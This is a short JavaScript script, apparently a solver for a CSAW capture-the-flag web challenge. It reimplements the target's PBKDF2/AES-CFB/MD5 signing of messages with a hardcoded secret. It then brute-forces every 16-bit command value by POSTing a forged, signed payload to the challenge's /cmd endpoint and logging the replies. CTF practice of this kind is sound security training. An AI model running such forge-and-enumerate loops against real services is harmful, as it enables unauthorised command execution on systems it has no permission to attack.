r = CryptoJS
function De(e) {
            var t = []
              , n = parseInt(e)
              , r = 4;
            do {
                t[--r] = 255 & n,
                n >>= 8
            } while (r);
            return t
        }

sss = function(e) {
    r = CryptoJS
    for (var t = e, r = CryptoJS, o = "1699641411", a = r.lib.WordArray.create([0]), i = r.algo.PBKDF2.create({
        keySize: 8,
        iterations: 100,
        hasher: r.algo.SHA256
    }).compute(o, a), l = r.lib.WordArray.create([0, 0, 0, 0]), u = r.AES.encrypt(t, i, {
        iv: l,
        mode: r.mode.CFB,
        padding: r.pad.Pkcs7
    }), c = r.MD5(u.ciphertext), s = 0; s < c.words.length; s++)
        for (var f = De(c.words[s]), d = 0; d < f.length; d++)
            t += String.fromCharCode(f[d]);
    return t
}
// x = sss("\u0000\u0000\u0000\u0014\u0001\u0001\u0006asdxxx")
// console.log(btoa(x))

for(i=0x0000; i<0xffff; i++){
cmd = String.fromCharCode(i);
enc = sss("\u0000\u0000\u0000\u0001"+cmd+"\u0001\u0004\u0000\u0000\u0000\u0001")
data = btoa(enc)
var url = 'http://web-chal.csaw.io:3333/cmd';
var requestData = {
  data: data
};

await fetch(url, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify(requestData)
})
  .then(response => response.text())
  .then(responseData => {
    const decodedData = atob(responseData);
    console.log(data, responseData, decodedData, i);
  });

}